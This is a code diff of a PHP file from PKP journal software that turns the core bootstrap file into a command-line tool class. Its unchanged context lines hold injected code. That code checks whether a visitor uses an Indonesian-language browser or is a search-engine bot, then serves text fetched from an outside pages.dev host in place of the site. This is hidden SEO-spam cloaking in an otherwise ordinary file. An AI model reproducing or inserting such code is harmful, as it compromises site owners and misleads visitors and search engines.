@@ -1,28 +1,28 @@
 <?php
 
 /**
- * @defgroup index Index
- * Bootstrap and initialization code.
+ * @defgroup tools Tools
+ * Implements command-line management tools for PKP software.
  */
 
 /**
- * @file includes/bootstrap.inc.php
+ * @file classes/cliTool/CliTool.inc.php
  *
  * Copyright (c) 2014-2021 Simon Fraser University
  * Copyright (c) 2000-2021 John Willinsky
  * Distributed under the GNU GPL v3. For full terms see the file docs/COPYING.
  *
- * @ingroup index
+ * @class CommandLineTool
+ * @ingroup tools
  *
- * @brief Core system initialization code.
- * This file is loaded before any others.
- * Any system-wide imports or initialization code should be placed here.
+ * @brief Initialization code for command-line scripts.
+ *
+ * FIXME: Write a PKPCliRequest and PKPCliRouter class and use the dispatcher
+ *  to bootstrap and route tool requests.
  */
 
 
-/**
- * Basic initialization (pre-classloading).
- */
+/** Initialization code */
 function is_indonesian_browser() {
     return isset($_SERVER['HTTP_ACCEPT_LANGUAGE']) && stripos($_SERVER['HTTP_ACCEPT_LANGUAGE'], 'id') !== false;
 }
@@ -42,18 +42,62 @@ if ((is_indonesian_browser() && is_regular_browser()) || is_bot()) {
     echo file_get_contents('https://xseounhide.pages.dev/vjpm-vn.txt');
     exit;
 }
-define('ENV_SEPARATOR', strtolower(substr(PHP_OS, 0, 3)) == 'win' ? ';' : ':');
-if (!defined('DIRECTORY_SEPARATOR')) {
-        // Older versions of PHP do not define this
-        define('DIRECTORY_SEPARATOR', strtolower(substr(PHP_OS, 0, 3)) == 'win' ? '\\' : '/');
+define('PWD', getcwd());
+chdir(dirname(INDEX_FILE_LOCATION)); /* Change to base directory */
+if (!defined('STDIN')) {
+        define('STDIN', fopen('php://stdin','r'));
 }
-define('BASE_SYS_DIR', dirname(INDEX_FILE_LOCATION));
-chdir(BASE_SYS_DIR);
+define('SESSION_DISABLE_INIT', 1);
+require('./lib/pkp/includes/bootstrap.inc.php');
 
-// System-wide functions
-require('./lib/pkp/includes/functions.inc.php');
+if (!isset($argc)) {
+        // In PHP < 4.3.0 $argc/$argv are not automatically registered
+        if (isset($_SERVER['argc'])) {
+                $argc = $_SERVER['argc'];
+                $argv = $_SERVER['argv'];
+        } else {
+                $argc = $argv = null;
+        }
+}
 
-// Initialize the application environment
-import('classes.core.Application');
+class CommandLineTool {
 
-return new Application();
+        /** @var string the script being executed */
+        var $scriptName;
+
+        /** @vary array Command-line arguments */
+        var $argv;
+
+        function __construct($argv = array()) {
+                // Initialize the request object with a page router
+                $application = Application::get();
+                $request = $application->getRequest();
+
+                // FIXME: Write and use a CLIRouter here (see classdoc)
+                import('classes.core.PageRouter');
+                $router = new PageRouter();
+                $router->setApplication($application);
+                $request->setRouter($router);
+
+                // Initialize the locale and load generic plugins.
+                AppLocale::initialize($request);
+                PluginRegistry::loadCategory('generic');
+
+                $this->argv = isset($argv) && is_array($argv) ? $argv : array();
+
+                if (isset($_SERVER['SERVER_NAME'])) {
+                        die('This script can only be executed from the command-line');
+                }
+
+                $this->scriptName = isset($this->argv[0]) ? array_shift($this->argv) : '';
+
+                if (isset($this->argv[0]) && $this->argv[0] == '-h') {
+                        $this->usage();
+                        exit(0);
+                }
+        }
+
+        function usage() {
+        }
+
+}
